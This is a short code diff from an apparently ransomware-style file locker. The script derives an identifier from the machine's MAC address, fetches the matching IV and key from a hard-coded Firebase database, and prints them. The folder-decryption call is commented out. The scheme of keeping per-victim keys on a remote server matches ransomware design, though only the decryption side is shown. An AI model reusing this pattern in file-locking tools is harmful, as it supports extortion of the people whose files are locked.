@@ -47,17 +47,23 @@ def search_dec(path):
     except PermissionError:
         pass
 
-testPath = 'C:/Users/tmdgh/Desktop/test123/'
+testPath = 'C:/Users/tmdgh/Desktop/test124/'
 
 mac = get_mac()
 password = str(mac)
+print(password)
 
-users = firebase.get('/user/'+ password, None)
+firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)
+users = firebase.get('/user' + '/' + password, None)
 print(users)
-hawi = list(users.values())[0]["IV"].encode('utf-16')
+hawi = list(users.values())[0]["Base"]
+print(hawi)
 
 iv = hawi[2:IV_SIZE+2]
-key= hawi[IV_SIZE+2:]
+print(iv)
 
-print("decoding")
-search_dec(testPath)
+key= hawi[IV_SIZE+2:]
+print(key)
+
+#print("decoding")
+#search_dec(testPath)
